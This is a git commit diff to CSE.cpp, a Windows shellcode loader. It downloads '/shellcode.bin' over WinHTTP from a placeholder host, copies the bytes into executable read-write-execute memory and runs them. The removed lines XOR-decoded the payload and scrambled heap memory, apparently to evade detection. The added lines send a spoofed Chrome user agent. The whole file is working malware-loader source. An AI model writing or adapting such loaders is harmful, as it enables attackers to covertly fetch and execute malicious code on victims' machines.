fdfe57d84c5566fbea51a5eaa7201114ce932d2b
Clowane <107830842+Clowane@users.noreply.github.com>
2023-04-29 21:33:23 +0800

    Update CSE.cpp

--- CSE.cpp
+++ CSE.cpp
@@ -4,6 +4,7 @@
 #include <Windows.h>
 #include <iostream>
 #include <vector>
+#include <ctime>
 #pragma comment(lib,"winhttp.lib")
 #pragma warning(disable:4996)
 
@@ -13,101 +14,54 @@ typedef struct Params {
 
 typedef VOID(*fprun)(PARAMS pParams);
 
-void XOR(char* data, int len, unsigned char key) {
-    for (int i = 0; i < len; i++)
-        data[i] ^= key;
-}
-
-const char key[2] = "A";
-size_t keySize = sizeof(key);
-
-void xbrLength(const char* key, const size_t keyLength, char* buffer, const size_t length) {
-    for (size_t i = 0; i < length; ++i) {
-        buffer[i] ^= key[i % keyLength];
-    }
-}
-
-PROCESS_HEAP_ENTRY entry;
-
-void HED() {
-    SecureZeroMemory(&entry, sizeof(entry));
-    while (HeapWalk(GetProcessHeap(), &entry)) {
-        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
-            xbrLength(key, keySize, (char*)(entry.lpData), entry.cbData);
-        }
-    }
-}
-
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    LPCWSTR rh = L"127.0.0.1";
-    int rp = 8080;
-    LPCWSTR rd = L"/shellcode.bin";
-    unsigned char k = 0x7e;
+    std::wstring serverName = L"127.0.0.1";
+    std::wstring objectName = L"/shellcode.bin";
 
-    HINTERNET hI, hHS, hHR;
-    DWORD dS, dSt, dStS, dD = 0;
-    LPSTR pOB;
-    std::vector<unsigned char> PEb;
+    HINTERNET hIS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    HINTERNET hIC = WinHttpConnect(hIS, serverName.c_str(), PORT, 0);
+    HINTERNET hIO = WinHttpOpenRequest(hIC, L"GET", objectName.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    WinHttpSendRequest(hIO, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    WinHttpReceiveResponse(hIO, NULL);
 
-    hI = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    hHS = WinHttpConnect(hI, rh, rp, 0);
-    hHR = WinHttpOpenRequest(hHS, L"GET", rd, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 
-    BOOL bR = WinHttpSendRequest(hHR, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-    bR = WinHttpReceiveResponse(hHR, NULL);
+    DWORD dS, dD;
+    std::vector<char> PEb;
 
     do {
         dS = 0;
-        if (!WinHttpQueryDataAvailable(hHR, &dS)) {
+        if (!WinHttpQueryDataAvailable(hIO, &dS)) {
         }
 
-        pOB = new char[dS + 1];
+        char* pOB = new char[dS + 1];
 
         if (!pOB) {
-            dS = 0;
+            return 0;
         }
 
         ZeroMemory(pOB, dS + 1);
 
-        if (!WinHttpReadData(hHR, (LPVOID)pOB, dS, &dD)) {
+        if (!WinHttpReadData(hIO, (LPVOID)pOB, dS, &dD)) {
+            delete[] pOB;
+            return 0;
         }
-        else {
-            PEb.insert(PEb.end(), pOB, pOB + dD);
-        }
+
+        PEb.insert(PEb.end(), pOB, pOB + dS);
+        delete[] pOB;
     } while (dS > 0);
 
     char* PE = (char*)malloc(PEb.size());
     for (int i = 0; i < PEb.size(); i++) {
-        PE[i] = PEb[i] ^ 0x7e;
+        PE[i] = PEb[i];
     }
 
-    PARAMS pP;
-    pP.pBaseAddress = (LPVOID)GetModuleHandleA(NULL);
-    LPVOID pB = VirtualAlloc(NULL, PEb.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    PARAMS pParams;
+    pParams.pBaseAddress = VirtualAlloc(NULL, PEb.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(pParams.pBaseAddress, PE, PEb.size());
 
-    if (NULL == pB) {
-        exit(1);
-    }
-
-    XOR(PE, PEb.size(), k);
-    memcpy(pB, PE, PEb.size());
-
-    HED();
-    Sleep(10);
-    HED();
-
-    fprun Run = (fprun)pB;
-    Run(pP);
-
-    WinHttpCloseHandle(hHR);
-    WinHttpCloseHandle(hHS);
-    WinHttpCloseHandle(hI);
-    free(PE);
-
-    __noop();
-    __noop();
-    __noop();
+    fprun run = (fprun)pParams.pBaseAddress;
+    run(pParams);
 
     return 0;
 }
